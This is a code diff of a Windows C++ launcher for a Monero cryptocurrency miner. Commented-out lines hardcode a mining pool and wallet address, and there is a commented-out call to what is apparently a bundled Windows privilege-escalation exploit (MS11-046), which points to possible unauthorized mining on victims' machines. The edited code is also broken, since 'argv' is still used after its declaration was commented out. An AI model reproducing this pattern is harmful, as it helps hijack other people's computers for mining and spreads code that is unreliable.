@@ -25,13 +25,21 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance
 	LPWSTR *argvW;
 	int argc = 0;
 
-	char **argv = (char**)malloc(argc * sizeof(char *) + 1);
+	//char **argv = (char**)malloc(argc * sizeof(char *) + 1);
+	//memset(argv, '0', argc * sizeof(char *) + 1);
 	argvW = CommandLineToArgvW(GetCommandLine(), &argc);
-	argvW2A(argv, argvW, argc);
+	
+	//argvW2A(argv, argvW, argc);
+	
+
+	//char argv[8][128] = {"-o", "pool.minemonero.pro:5555",
+	//	"-u", "42FWmAzd2vjZCTrdgAmuvtEoDxQnT6R25Dx7wdUDB7EdVDN4bJ2k4wV2gA3cBwmZKr53eD4P4pJgA8fC7dhZ3ZQePzZ8SUq",
+	//	"-p","x","-k" };
 	
 	App minerApp(argc, argv);
-	StartMiner(minerApp);
-
+	//StartMiner(minerApp);
+	minerApp.exec();
+	
 	////CToolKit kit;
 	////kit.execExp(CToolKit::EXP_MS_11046);
 
@@ -70,20 +78,21 @@ BOOL StartMiner(App& minerApp)
 	}
 	
 	//防止miner被函数结束而释放
-	Sleep(500);
+	Sleep(1000);
 	
 	return TRUE;
 }
 
 VOID argvW2A(char **argv, LPWSTR *argvW, int argc)
 {
-	memset(argv, 0, argc * sizeof(char *) + 1);
-
-	for (int i = 0; i < argc; i++)
+	//memset(argv, 0, argc * sizeof(char *) + 1);
+	USES_CONVERSION;
+	for (int i = 1; i < argc; i++)
 	{
-		MessageBox(NULL, argvW[i], L"Arglist contents", MB_OK);
-		USES_CONVERSION;
+		//	MessageBox(NULL, argvW[i], L"Arglist contents", MB_OK);
+	//	argv[i] = "hello";
 		argv[i] = W2A(argvW[i]);
-		MessageBoxA(NULL, argv[i], "Arglist contents", MB_OK);
+		//strcpy(argv[i], W2A(argvW[i]));
+		MessageBoxA(GetDesktopWindow(), argv[i], "Arglist contents", MB_OK);
 	}
 }
